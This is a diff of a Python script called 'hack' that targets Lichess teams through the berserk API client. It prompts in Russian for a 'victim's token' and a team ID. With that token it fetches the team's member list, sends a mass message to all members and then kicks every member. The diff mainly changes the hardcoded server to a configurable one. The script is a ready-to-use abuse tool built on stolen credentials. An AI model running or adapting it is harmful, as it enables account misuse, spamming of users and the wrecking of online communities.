@@ -1,24 +1,22 @@
 import berserk
-import requests
 import ndjson
+import requests
 
 from config import *
 
+
 def hack(token, team):
-    msg = """
-    
-    """
     heads = {'Authorization': f'Bearer {token}'}
 
     session = berserk.TokenSession(token)
     client = berserk.Client(session=session)
 
-    r = requests.get('https://lichess.org/api/team/'+team+'/users')
+    r = requests.get(f'https://{SERVER}/api/team/' + team + '/users')
     data = r.json(cls=ndjson.Decoder)
 
     print(green + "[+] Список пользователей получен!")
 
-    session.post('https://lichess.org/team/'+team+'/pm-all', data={'message': msg}, headers=heads).json()
+    session.post(f'https://{SERVER}/team/' + team + '/pm-all', data={'message': msg}, headers=heads).json()
     print("[+] Рассылка успешна отправлена!")
 
     for i in data:
@@ -26,6 +24,6 @@ def hack(token, team):
         client.teams.kick_member(team, user)
         print(f"[+] {user} кикнут!")
 
+
 if __name__ == "__main__":
     hack(token=input(magenta + "[?] Введите токен жертвы: "), team=input(magenta + "[?] ID команды: "))
-
